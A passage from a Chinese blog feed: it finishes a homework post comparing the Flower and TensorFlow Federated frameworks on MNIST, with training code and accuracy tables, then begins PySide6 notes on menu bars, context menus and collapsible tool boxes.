不同，针对类似元组的容器，TFF 具有单个抽象类型构造函数 <code>tff.StructType</code>。命名元组在TFF中广泛用于表示模型的参数、输入输出数据格式以及在联合计算中传递的数据。每个元素的名称提供了额外的语义信息，有助于理解和维护复杂的联合学习算法。</p><p>然后是损失函数部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@tf.function</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward_pass</span>(<span class="params">model, batch</span>):</span><br><span class="line">    predicted_y = tf.nn.softmax(</span><br><span class="line">        tf.matmul(batch[<span class="string">&#x27;x&#x27;</span>], model[<span class="string">&#x27;weights&#x27;</span>]) + model[<span class="string">&#x27;bias&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> -tf.reduce_mean(</span><br><span class="line">        tf.reduce_sum(</span><br><span class="line">            tf.one_hot(batch[<span class="string">&#x27;y&#x27;</span>], <span class="number">10</span>) * tf.math.log(predicted_y), axis=[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="meta">@tff.tf_computation(<span class="params">MODEL_TYPE, BATCH_TYPE</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">batch_loss</span>(<span class="params">model, batch</span>):</span><br><span class="line">    <span class="keyword">return</span> forward_pass(model, batch)</span><br></pre></td></tr></table></figure><p>首先，模型的输出通过<code>tf.matmul</code>（矩阵乘法）和加上偏差后，使用<code>tf.nn.softmax</code>函数进行softmax处理。这一步是为了将模型输出转换为概率分布。损失函数使用的是交叉熵损失，这在多类分类问题中很常见。具体来说，它计算了实际标签的one-hot编码和预测概率分布之间的交叉熵。最后通过<code>tf.reduce_mean</code>计算所有样本的平均损失值。</p><p>初始化参数部分与普通的机器学习模型类似，这里就跳过分析</p><p>模型训练函数如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@tff.tf_computation(<span class="params">MODEL_TYPE, BATCH_TYPE, tf.float32</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">batch_train</span>(<span class="params">initial_model, batch, learning_rate</span>):</span><br><span class="line">    <span class="comment"># Define a group of model variables and set them to `initial_model`. Must</span></span><br><span class="line">    <span class="comment"># be defined outside the @tf.function.</span></span><br><span class="line">    model_vars = collections.OrderedDict([</span><br><span class="line">      (name, tf.Variable(name=name, initial_value=value))</span><br><span class="line">      <span class="keyword">for</span> name, value <span class="keyword">in</span> initial_model.items()</span><br><span class="line">    ])</span><br><span class="line">    optimizer = tf.keras.optimizers.SGD(learning_rate)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tf.function</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_train_on_batch</span>(<span class="params">model_vars, batch</span>):</span><br><span class="line">        <span class="comment"># Perform one step of gradient descent using loss from `batch_loss`.</span></span><br><span class="line">        <span class="keyword">with</span> tf.GradientTape() <span class="keyword">as</span> tape:</span><br><span class="line">            loss = forward_pass(model_vars, batch)</span><br><span class="line">        grads = tape.gradient(loss, model_vars)</span><br><span class="line">        optimizer.apply_gradients(</span><br><span class="line">            <span class="built_in">zip</span>(tf.nest.flatten(grads), tf.nest.flatten(model_vars)))</span><br><span class="line">        <span class="keyword">return</span> model_vars</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _train_on_batch(model_vars, batch)</span><br></pre></td></tr></table></figure><p>该模型使用keras库中的<strong>随机梯度下降（SGD）优化器</strong></p><p>函数<code>_train_on_batch</code>被定义为一个<code>@tf.function</code>，这样可以让TensorFlow优化执行效率。这个函数执行模型的一次前向传递计算损失（使用<code>forward_pass</code>），然后使用梯度带（<code>tf.GradientTape</code>）计算梯度，并应用这些梯度来更新模型变量。</p><p>有了模型训练函数，我们就可以开始模拟在客户端本地的训练了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">local_train</span>(<span class="params">initial_model, learning_rate, all_batches</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Mapping function to apply to each batch.</span></span><br><span class="line"><span class="meta">    @tff.federated_computation(<span class="params">MODEL_TYPE, BATCH_TYPE</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">batch_fn</span>(<span class="params">model, batch</span>):</span><br><span class="line">        <span class="keyword">return</span> batch_train(model, batch, learning_rate)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tff.sequence_reduce(all_batches, initial_model, batch_fn)</span><br></pre></td></tr></table></figure><p>模型初始化以及训练模块均使用刚刚定义的<code>initial_model</code>和<code>batch_train</code>函数</p><p>以及本地评估函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@tff.federated_computation(<span class="params">MODEL_TYPE, LOCAL_DATA_TYPE</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local_eval</span>(<span class="params">model, all_batches</span>):</span><br><span class="line">    <span class="comment"># TODO(b/120157713): Replace with `tff.sequence_average()` once implemented.</span></span><br><span class="line">    <span class="keyword">return</span> tff.sequence_sum(</span><br><span class="line">        tff.sequence_map(</span><br><span class="line">            tff.federated_computation(<span class="keyword">lambda</span> b: batch_loss(model, b), BATCH_TYPE),</span><br><span class="line">            all_batches))</span><br></pre></td></tr></table></figure><p>接着我们需要实现联合训练，实现联合训练的最简单方法是进行本地训练，然后对模型进行平均。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SERVER_FLOAT_TYPE = tff.type_at_server(tf.float32)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@tff.federated_computation(<span class="params">SERVER_MODEL_TYPE, SERVER_FLOAT_TYPE,</span></span></span><br><span class="line"><span class="params"><span class="meta">                           CLIENT_DATA_TYPE</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">federated_train</span>(<span class="params">model, learning_rate, data</span>):</span><br><span class="line">  <span class="keyword">return</span> tff.federated_mean(</span><br><span class="line">      tff.federated_map(local_train, [</span><br><span class="line">          tff.federated_broadcast(model),</span><br><span class="line">          tff.federated_broadcast(learning_rate), data</span><br><span class="line">      ]))</span><br></pre></td></tr></table></figure><p>它接受三个参数：服务器上的模型（<code>SERVER_MODEL_TYPE</code>），服务器上的浮点数（学习率，<code>SERVER_FLOAT_TYPE</code>），以及客户端的数据类型（<code>CLIENT_DATA_TYPE</code>）。</p><p>函数返回联合平均的结果。<code>tff.federated_map</code>将<code>local_train</code>函数应用于每个客户端，<code>tff.federated_broadcast</code>用于将模型和学习率从服务器广播到各个客户端。然后，这些局部训练的结果被收集起来，并通过<code>tff.federated_mean</code>计算它们的平均值，从而完成一次联合训练迭代。</p><p>当然，我们可以像下面的原版教程一样，使用损失值来评估最后的效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">model = initial_model</span><br><span class="line">learning_rate = <span class="number">0.1</span></span><br><span class="line"><span class="keyword">for</span> round_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">  model = federated_train(model, learning_rate, federated_train_data)</span><br><span class="line">  learning_rate = learning_rate * <span class="number">0.9</span></span><br><span class="line">  loss = federated_eval(model, federated_train_data)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;round &#123;&#125;, loss=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(round_num, loss))</span><br></pre></td></tr></table></figure><p>重点来了，我们<strong>想要和Flower框架的Demo一样输出准确率</strong>，方便进行对比</p><p>新增一个计算准确率的函数<code>compute_accuracy</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">compute_accuracy</span>(<span class="params">model, federated_data</span>):</span><br><span class="line">    total_accuracy = <span class="number">0.0</span></span><br><span class="line">    total_samples = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> client_data <span class="keyword">in</span> federated_data:</span><br><span class="line">        <span class="keyword">for</span> batch <span class="keyword">in</span> client_data:</span><br><span class="line">            x, y = batch[<span class="string">&#x27;x&#x27;</span>], batch[<span class="string">&#x27;y&#x27;</span>]</span><br><span class="line">            predicted_y = tf.nn.softmax(tf.matmul(x, model[<span class="string">&#x27;weights&#x27;</span>]) + model[<span class="string">&#x27;bias&#x27;</span>])</span><br><span class="line">            correct_prediction = tf.equal(tf.argmax(predicted_y, axis=<span class="number">1</span>), y)</span><br><span class="line">            batch_accuracy = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))</span><br><span class="line">            total_accuracy += batch_accuracy.numpy() * <span class="built_in">len</span>(y)</span><br><span class="line">            total_samples += <span class="built_in">len</span>(y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> total_accuracy / total_samples</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样我们可以通过获取相同epoch下两个框架的准确率和损失，来对比训练效率</p><h1 id="运行Demo"><a href="#运行Demo" class="headerlink" title="运行Demo"></a>运行Demo</h1><h2 id="Flower-4"><a href="#Flower-4" class="headerlink" title="Flower"></a>Flower</h2><p>首先启动服务端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Flower_server.py</span><br></pre></td></tr></table></figure><p>重新开一个进程，运行如下指令启动客户端0</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Flower_client.py</span><br></pre></td></tr></table></figure><p>同样，等待几秒后启动客户端1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Flower_client.py</span><br></pre></td></tr></table></figure><p>服务端显示如下<img src="/posts/ec146cb37934/image-20231222132012014.png" class="" title="image-20231222132012014"></p><p>客户端显示如下</p><img src="/posts/ec146cb37934/image-20231222131934588.png" class="" title="image-20231222131934588"><p>如下图所示，最后的准确率达到了<code>0.8521</code></p><img src="/posts/ec146cb37934/image-20231222132103889.png" class="" title="image-20231222132103889"><h2 id="TFF-3"><a href="#TFF-3" class="headerlink" title="TFF"></a>TFF</h2><p>安装Demo运行所需特定版本的依赖库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install protobuf==3.19.0</span><br></pre></td></tr></table></figure><p>执行如下指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python TFF_test.py</span><br></pre></td></tr></table></figure><p>运行结果如下</p><img src="/posts/ec146cb37934/image-20231222132310148.png" class="" title="image-20231222132310148"><p>可以看到，30轮后准确率达到了<code>0.6843</code></p><h1 id="分析与总结"><a href="#分析与总结" class="headerlink" title="分析与总结"></a>分析与总结</h1><p>下面是实验结果的对比表格</p><div class="table-container"><table><thead><tr><th>特性/框架</th><th>Flower 实验结果</th><th>TFF 实验结果</th></tr></thead><tbody><tr><td><strong>客户端数量</strong></td><td>2</td><td>2</td></tr><tr><td><strong>训练数据集</strong></td><td>MNIST</td><td>MNIST</td></tr><tr><td><strong>模型结构</strong></td><td>简单的多层感知机</td><td>简单的多层感知机</td></tr><tr><td><strong>准确率</strong></td><td>0.8521</td><td>0.6843</td></tr><tr><td><strong>训练轮次</strong></td><td>30轮</td><td>30轮</td></tr></tbody></table></div><p>通过这些结果，我们可以看到在相同条件下，Flower框架在这次实验中的准确率表现优于TFF。这可能归因于Flower在客户端管理和模型更新策略上的不同实现。当然，这样的实验结果并不足以全面评估两个框架的性能，还需要考虑实验的详细设置和参数调整等因素。</p><p>从Demo的形式上来讲，Flower的Demo更能模拟现实场景的联邦学习中服务端与客户端的交互。</p><p>总结来说，Flower框架在易用性、扩展性和表现突出，而TFF则在与TensorFlow的集成度、专业性以及对复杂模型的处理能力方面有优势。</p><p>下面是对两个框架的特性的总结表格</p><div class="table-container"><table><thead><tr><th>框架</th><th>Flower</th><th>TFF</th></tr></thead><tbody><tr><td><strong>设计目标</strong></td><td>大规模联邦学习实验</td><td>与TensorFlow紧密集成的联邦学习</td></tr><tr><td><strong>易用性</strong></td><td>高度集成的API，易于搭建和开始</td><td>需要熟悉TensorFlow生态系统</td></tr><tr><td><strong>扩展性</strong></td><td>支持大量客户端，适合边缘设备</td><td>灵活的API，适合多种机器学习模型和算法</td></tr><tr><td><strong>专业性</strong></td><td>强调实用性和灵活性</td><td>提供高度专业化的联邦学习元素</td></tr><tr><td><strong>性能</strong></td><td>面向实际环境的优化</td><td>优化了复杂数据处理和模型训练</td></tr><tr><td><strong>社区和支持</strong></td><td>活跃的社区和完善的官方文档</td><td>谷歌支持和广泛的技术资源</td></tr></tbody></table></div>]]></content>
      
      
      
        <tags>
            
            <tag> project </tag>
            
            <tag> 数据安全与隐私计算 </tag>
            
            <tag> homework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python3 pyside6学习笔记及实践（三）</title>
      <link href="/posts/341ddbf96da0/"/>
      <url>/posts/341ddbf96da0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本系列文章为b站PySide6教程以及官方文档的学习笔记</p><p>b站教程视频传送门如下</p><div class="flink"> <div class="flink-list">          <div class="flink-list-item">            <a href="https://www.bilibili.com/video/BV1c84y1N7iL" title="【已完结】PySide6百炼成真，带你系统性入门Qt" target="_blank">              <div class="flink-item-icon">                <img class="no-lightbox" src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/a0589121b678174899c451c1a47538260e1b6e70.jpg@320w_200h_1c_!web-space-favlist-video.webp" onerror='this.onerror=null;this.src="/img/friend_404.gif"' alt="【已完结】PySide6百炼成真，带你系统性入门Qt" />              </div>              <div class="flink-item-name">【已完结】PySide6百炼成真，带你系统性入门Qt</div>               <div class="flink-item-desc" title="祝大家百炼成真，早日做出自己心仪的界面">祝大家百炼成真，早日做出自己心仪的界面</div>            </a>          </div></div></div><p>官方文档链接：<a href="https://doc.qt.io/qtforpython-6/">Qt for Python</a></p><h2 id="菜单栏"><a href="#菜单栏" class="headerlink" title="菜单栏"></a>菜单栏</h2><h3 id="相关控件"><a href="#相关控件" class="headerlink" title="相关控件"></a>相关控件</h3><ol><li><strong>QMenuBar</strong>: 这是最顶层的菜单栏控件，通常位于窗口的顶部。它作为容纳多个菜单（<code>QMenu</code> 对象）的容器。一个标准的桌面应用程序通常有一个菜单栏，包含如“文件”、“编辑”、“视图”等标准菜单。</li><li><strong>QMenu</strong>: 这个控件代表菜单栏中的一个单独菜单，例如“文件”菜单。每个 <code>QMenu</code> 对象可以包含多个 <code>QAction</code> 对象，这些对象代表具体的命令或选项，如“打开”、“保存”、“退出”等。</li><li><strong>QAction</strong>: 这是代表具体操作的控件。它可以是菜单项、工具栏按钮或者是键盘快捷键的触发器。通过 <code>QAction</code>，我们可以定义当用户点击菜单项或按下快捷键时应该执行的动作。</li></ol><p>它们的<strong>逻辑关系</strong>是这样的：<code>QMenuBar</code> 包含多个 <code>QMenu</code>，每个 <code>QMenu</code> 包含多个 <code>QAction</code>。用户通过点击 <code>QAction</code> 来触发具体的功能。</p><div class="note warning flat"><p>当我们想为窗体添加菜单栏时，<strong>窗体类型必须是QMainWindow</strong></p></div><p>菜单栏中的菜单可以出现嵌套关系，即一个菜单中除了操作外还有<strong>子菜单</strong></p><p>在日常使用的软件中经常会出现这种情况</p><h3 id="使用QtDesigner快速构建菜单栏"><a href="#使用QtDesigner快速构建菜单栏" class="headerlink" title="使用QtDesigner快速构建菜单栏"></a>使用QtDesigner快速构建菜单栏</h3><img src="/posts/341ddbf96da0/image-20231218143611032.png" class="" title="image-20231218143611032"><p>当我们在QtDesigner在创建一个MainWindow窗口时，顶部会自动放置一个菜单栏</p><p>点击编辑栏后即可开始往菜单栏中添加菜单，<strong>输入完毕需要敲回车键确认</strong></p><img src="/posts/341ddbf96da0/image-20231218144220778.png" class="" title="image-20231218144220778"><p>当我们添加了一个菜单之后，我们可以选择点击右边的编辑栏继续向菜单栏添加菜单，或者点击当前菜单下方的编辑栏，向当前菜单中添加子菜单或操作</p><p>菜单中的子菜单在QtDesigner中只能输入英文，如果想要输入中文，可以在属性中设置</p><img src="/posts/341ddbf96da0/image-20231218145135339.png" class="" title="image-20231218145135339"><p>点击操作项右边的拓展图标，我们可以将其变为子菜单</p><img src="/posts/341ddbf96da0/image-20231218145302166.png" class="" title="image-20231218145302166"><p>接着我们就能在该子菜单中添加操作和子菜单</p><img src="/posts/341ddbf96da0/image-20231218145354965.png" class="" title="image-20231218145354965"><p>分隔符在菜单栏的设计中通常是用来将菜单中的不同功能分隔开，使其更加美观，所以说其实可有可无</p><p>在<strong>动作编辑器</strong>中，我们可以为具体操作<strong>配置图标和快捷键</strong></p><img src="/posts/341ddbf96da0/image-20231218150154124.png" class="" title="image-20231218150154124"><p>当然，我们还可以通过右键窗口来添加<strong>工具栏</strong></p><img src="/posts/341ddbf96da0/image-20231218150328624.png" class="" title="image-20231218150328624"><p>可以直接将已有操作拖入工具栏</p><img src="/posts/341ddbf96da0/image-20231218150430012.png" class="" title="image-20231218150430012"><h3 id="结构语法"><a href="#结构语法" class="headerlink" title="结构语法"></a>结构语法</h3><p>在设计时，我们一般是先想到有哪些菜单需要实现，再去详细设计这些菜单下的操作</p><p>但是在编写代码时，我们需要<strong>自底向上，先将操作/子菜单添加到菜单，再将菜单添加到菜单栏</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyWindow</span>(<span class="title class_ inherited__">QMainWindow</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">        self.menu = self.menuBar()</span><br><span class="line"></span><br><span class="line">        self.openFile = QAction(<span class="string">&#x27;打开文件&#x27;</span>)</span><br><span class="line">        self.closeFile = QAction(<span class="string">&#x27;关闭文件&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.moreMenu = QMenu(<span class="string">&#x27;更多&#x27;</span>)</span><br><span class="line">        self.more1 = QAction(<span class="string">&#x27;更多1&#x27;</span>)</span><br><span class="line">        self.more2 = QAction(<span class="string">&#x27;更多2&#x27;</span>)</span><br><span class="line">        self.moreMenu.addAction(self.more1)</span><br><span class="line">        self.moreMenu.addAction(self.more2)</span><br><span class="line"></span><br><span class="line">        self.fileMenu = QMenu(<span class="string">&#x27;文件&#x27;</span>)</span><br><span class="line">        self.fileMenu.addAction(self.openFile)</span><br><span class="line">        self.fileMenu.addAction(self.closeFile)</span><br><span class="line">        self.fileMenu.addMenu(self.moreMenu)</span><br><span class="line"></span><br><span class="line">        self.menu.addMenu(self.fileMenu)</span><br><span class="line"></span><br><span class="line">        self.mainlayout = QVBoxLayout()</span><br><span class="line">        self.setLayout(self.mainlayout)</span><br></pre></td></tr></table></figure><p>我们使用<code>addAction()</code>方法将操作添加到菜单中</p><p>使用<code>addMenu()</code>方法可以将子菜单添加到菜单中，或将菜单添加到菜单栏中</p><p>同时我们也可以将操作项的<strong>triggered信号</strong>绑定到槽</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.openFile.triggered.connect(<span class="keyword">lambda</span>: <span class="built_in">print</span>(<span class="string">&#x27;打开文件&#x27;</span>))</span><br><span class="line">self.closeFile.triggered.connect(<span class="keyword">lambda</span>: <span class="built_in">print</span>(<span class="string">&#x27;关闭文件&#x27;</span>))</span><br><span class="line">self.more1.triggered.connect(<span class="keyword">lambda</span>: <span class="built_in">print</span>(<span class="string">&#x27;更多1&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="上下文菜单"><a href="#上下文菜单" class="headerlink" title="上下文菜单"></a>上下文菜单</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>上下文菜单即我们在应用程序中右键点出的菜单</p><p><style>.fiuohhfbhxto{zoom:50%;}</style><img src="/posts/341ddbf96da0/image-20231218155228810.png" class="fiuohhfbhxto" alt="image-20231218155228810"></p><p>这里贴一张Edge浏览器的上下文菜单截图，可以发现与我们的普通菜单的元素非常相似</p><p>事实上在代码实现上，上下文菜单的实现逻辑也和菜单栏和相似</p><h3 id="为窗体添加上下文菜单"><a href="#为窗体添加上下文菜单" class="headerlink" title="为窗体添加上下文菜单"></a>为窗体添加上下文菜单</h3><p>我们可以为窗体本身或者控件添加上下文菜单</p><p>先来介绍如何给窗体本身添加</p><p>将窗体想象为一个菜单，那么我们就可以向其中添加子菜单和操作</p><p>但是在添加之前，我们需要先<strong>设置上下文菜单策略</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtCore <span class="keyword">import</span> Qt</span><br><span class="line">self.setContextMenuPolicy(Qt.ContextMenuPolicy.ActionsContextMenu)</span><br></pre></td></tr></table></figure><p>接下来我们直接使用窗体本身的<code>addAction()</code>方法来添加菜单项</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">self.addAction(self.openFile)</span><br><span class="line">self.addAction(self.closeFile)</span><br></pre></td></tr></table></figure><p>添加菜单项时，也可以使用更简洁的列表添加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.addActions([self.openFile,self.closeFile])</span><br></pre></td></tr></table></figure><h3 id="为控件添加上下文菜单"><a href="#为控件添加上下文菜单" class="headerlink" title="为控件添加上下文菜单"></a>为控件添加上下文菜单</h3><p>其实许多控件本身是自带上下文菜单的</p><p>当我们在页面中添加一个编辑框并右击它时，会出现如下的上下文菜单</p><img src="/posts/341ddbf96da0/image-20240207173152919.png" class="" title="image-20240207173152919"><p>包括重做、恢复、复制、粘贴等对输入内容的基本操作</p><p>当然，我们也可以修改这个默认的上下文菜单，向其中添加自定义操作</p><p>首先我们还是需要<strong>为控件设置上下文菜单策略</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.lineEdit1.setContextMenuPolicy(Qt.ContextMenuPolicy.ActionsContextMenu)</span><br></pre></td></tr></table></figure><p>接下来我们对控件使用<code>addActions()</code>方法来添加菜单项</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.sendValue = QAction(<span class="string">&#x27;发送值到输入框2&#x27;</span>)</span><br><span class="line">self.showCurrentValue = QAction(<span class="string">&#x27;显示当前值&#x27;</span>)</span><br><span class="line">self.lineEdit1.addActions([self.sendValue, self.showCurrentValue])</span><br></pre></td></tr></table></figure><p>最后我们可以为这两个操作绑定逻辑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">self.sendValue.triggered.connect(<span class="keyword">lambda</span>: self.lineEdit2.setText(self.lineEdit1.text()))</span><br><span class="line">        self.showCurrentValue.triggered.connect(<span class="keyword">lambda</span>: <span class="built_in">print</span>(self.lineEdit1.text()))</span><br></pre></td></tr></table></figure><h2 id="折叠菜单"><a href="#折叠菜单" class="headerlink" title="折叠菜单"></a>折叠菜单</h2><p>首先规划选项卡中的布局和内容</p><p>这里我们写两个选项卡用于演示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建折叠选项卡内容</span></span><br><span class="line">self.widget1 = QWidget()</span><br><span class="line">self.widget1Layout = QVBoxLayout()</span><br><span class="line">self.widget1Layout.addWidget(QLabel(<span class="string">&#x27;这是第一个选项卡&#x27;</span>))</span><br><span class="line">self.widget1Layout.addWidget(QPushButton(<span class="string">&#x27;按钮1&#x27;</span>))</span><br><span class="line">self.widget1.setLayout(self.widget1Layout)</span><br><span class="line"></span><br><span class="line">self.widget2 = QWidget()</span><br><span class="line">self.widget2Layout = QVBoxLayout()</span><br><span class="line">self.widget2Layout.addWidget(QLabel(<span class="string">&#x27;这是第二个选项卡&#x27;</span>))</span><br><span class="line">self.widget2Layout.addWidget(QPushButton(<span class="string">&#x27;按钮2&#x27;</span>))</span><br><span class="line">self.widget2.setLayout(self.widget2Layout)</span><br></pre></td></tr></table></figure><p>接下来我们创建折叠窗<code>QToolBox</code>，并将选项卡用<code>addItem</code>方法置入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">self.toolBox = QToolBox()</span><br><span class="line">self.toolBox.addItem(self.widget1, <span class="string">&#x27;选项卡1&#x27;</span>)</span><br><span class="line">self.toolBox.addItem(self.widget2, <span class="string">&#x27;选项卡2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">self.mainlayout = QVBoxLayout()</span><br><span class="line">self.mainlayout.addWidget(self.toolBox)</span><br><span class="line">self.setLayout(self.mainlayout)</span><br></pre></td></tr></table></figure><p>效果如下</p><img src="/posts/341ddbf96da0/2024-02-07-19-15-00.gif" class="" title="2024-02-07-19-15-00"><p>当然我们也可以加上图标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个右箭头图标和一个下箭头图标</span></span><br><span class="line">self.arrowRight = self.style().standardIcon(QStyle.StandardPixmap.SP_ArrowRight)</span><br><span class="line">self.arrowDown = self.style().standardIcon(QStyle.StandardPixmap.SP_ArrowDown)</span><br><span class="line"></span><br><span class="line">self.toolBox = QToolBox()</span><br><span class="line">self.toolBox.addItem(self.widget1, self.arrowDown,<span class="string">&#x27;选项卡1&#x27;</span>)</span><br><span class="line">self.toolBox.addItem(self.widget2, self.arrowRight,<span class="string">&#x27;选项卡2&#x27;</span>)</span><br><span class="line">self.toolBox.currentChanged.connect(self.changeArrow)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeArrow</span>(<span class="params">self, index</span>):</span><br><span class="line">        <span class="comment"># 全部重置为右箭头</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.toolBox.count()):</span><br><span class="line">            self.toolBox.setItemIcon(i, self.arrowRight)</span><br><span class="line">        <span class="comment"># 